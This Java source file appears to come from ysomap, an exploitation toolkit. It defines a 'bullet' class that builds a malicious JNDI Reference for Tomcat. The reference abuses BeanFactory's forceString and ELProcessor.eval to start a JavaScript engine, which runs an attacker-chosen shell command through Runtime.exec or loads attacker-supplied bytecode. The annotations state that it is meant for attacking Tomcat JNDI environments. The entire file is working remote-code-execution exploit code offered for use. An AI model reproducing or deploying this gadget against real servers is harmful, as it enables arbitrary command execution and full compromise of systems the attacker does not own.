package ysomap.bullets.jdk.rmi;

import org.apache.naming.ResourceRef;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

/**
 * @author wh1t3P1g
 * @since 2020/2/27
 */
@Bullets
@Dependencies({"org.apache.tomcat:tomcat-catalina:xxx"})
@Details("JNDI Reference的一种，适用于攻击tomcat环境下的JNDI")
@Targets({Targets.JDK, Targets.HESSIAN})
@Authors({Authors.WH1T3P1G, Authors.KINGX})
public class TomcatRefBullet extends AbstractBullet<Reference> {

    @NotNull
    @Require(name = "body", detail = "根据type类型，传入命令或代码")
    private String body;

    @Require(name = "classname", detail = "当type为代码时，需要填上最终载入的classname")
    private String classname;

    @NotNull
    @Require(name = "type", detail = "支持两种类型，cmd和code，code部分为字节码执行，需要提供base64后的字节码以及classname")
    private String type;

    @Override
    public Reference getObject() throws Exception {
        String data;
        if(type.equals("cmd")) {
            data = getPayload(PayloadHelper.makeRuntimeExecPayload(body));
        }else if(type.equals("code")) {
            if(classname == null){
                classname = "pwn"+System.currentTimeMillis();
            }
            data = getPayload(PayloadHelper.makeJsDefinedClass(classname, body));
        }else{
            throw new Exception("type must be cmd or code");
        }

        ResourceRef ref = new ResourceRef(
                "javax.el.ELProcessor",
                null, "", "",
                true,"org.apache.naming.factory.BeanFactory",
                null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", data));
        return ref;
    }

    public String getPayload(String data){
        return "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                ".newInstance().getEngineByName(\"JavaScript\")" +
                ".eval(\""+ data +"\")";
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new TomcatRefBullet();
        bullet.set("type", args[0]);
        bullet.set("body", args[1]);
        if(args.length > 2) {
            bullet.set("classname", args[2]);
        }
        return bullet;
    }
}
